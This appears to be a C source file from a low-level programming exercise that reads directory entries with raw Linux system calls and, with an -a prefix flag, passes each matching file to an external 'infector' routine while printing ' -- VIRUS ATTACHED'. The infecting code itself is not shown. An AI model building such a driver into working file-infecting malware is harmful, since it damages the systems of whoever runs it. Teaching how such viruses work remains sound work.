#include "util.h"

#define SYS_EXIT 1
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

#define O_DIRECTORY	0200000
#define O_RDONLY 00
#define O_RDWR 02

#define STDOUT 1
#define NULL 0
#define BUF_SIZE 8192
#define ERR_EXIT_CODE 0x55


typedef struct dirent {
	int inode;
	int offset;

	short structSize;
	char fileName[256];
} dirent;


extern int system_call();
extern void infection(int);
extern int infector(char*);
/* extern int infector(char*); */

/* typedef struct dirent dirent; */


int main (int argc , char* argv[], char* envp[]) {
	int folderDescriptor = 0;

	int i = 0;

	char prefixFlag = 0;
	char *prefix = NULL;
	int prefixLen = 0;
	
	dirent *fileInfo = NULL;
	long bytesRead = 0;
	char bytesArray[BUF_SIZE];
	char *bytesIterator = NULL;

	char *virusAttached = " -- VIRUS ATTACHED";
	int virusAttachedLen = strlen(virusAttached);

	for (i = 0; i < argc; ++i) {
		if (strncmp(argv[i], "-a", 2) == 0) {
			prefixFlag = 1;
			prefix = argv[i] + 2;
			prefixLen = strlen(prefix);
			
			system_call(SYS_WRITE, STDOUT, "prefix: ", 8);
			system_call(SYS_WRITE, STDOUT, prefix, prefixLen );
			system_call(SYS_WRITE,STDOUT,"\n",1);
			
			break;
		}
	}

	folderDescriptor = system_call(SYS_OPEN, ".", O_RDONLY/* | O_DIRECTORY */, 0);
	if(folderDescriptor < 0) {
		system_call(SYS_WRITE, STDOUT, "error\n", 6);
		system_call(SYS_EXIT, ERR_EXIT_CODE, 0, 0);
	}

	bytesRead = system_call(SYS_GETDENTS , folderDescriptor, bytesArray, BUF_SIZE);

	system_call(SYS_CLOSE, folderDescriptor); /* close the folder's descriptor */

	/* system_call(SYS_WRITE, STDOUT, itoa(bytesRead), 12);
	system_call(SYS_WRITE, STDOUT, " bytes were read", 16);
	system_call(SYS_WRITE,STDOUT,"\n",1); */
	
	system_call(SYS_WRITE, STDOUT, "\n", 1);
	char *bytesArrayEnd = bytesArray + bytesRead;

	for (bytesIterator = bytesArray; bytesIterator < bytesArrayEnd; bytesIterator += fileInfo->structSize) {
		fileInfo = (dirent*)bytesIterator;

		if (strncmp(fileInfo->fileName, ".", 2) == 0 ||
			strncmp(fileInfo->fileName, "..", 3) == 0) {
			continue;
		}

		system_call(SYS_WRITE, STDOUT, fileInfo->fileName, strlen(fileInfo->fileName));

		if (prefixFlag && strncmp(fileInfo->fileName, prefix, prefixLen) == 0) {
			system_call(SYS_WRITE, STDOUT, virusAttached, virusAttachedLen);

			/* int a =  */
				infector(fileInfo->fileName);

			/* system_call(SYS_WRITE, STDOUT, "descriptor was: ", 20);
			system_call(SYS_WRITE, STDOUT, itoa(a), 12);
			system_call(SYS_WRITE,STDOUT,"\n",1); */
		}

		system_call(SYS_WRITE, STDOUT, "\n", 1);
	}

	return 0;
}
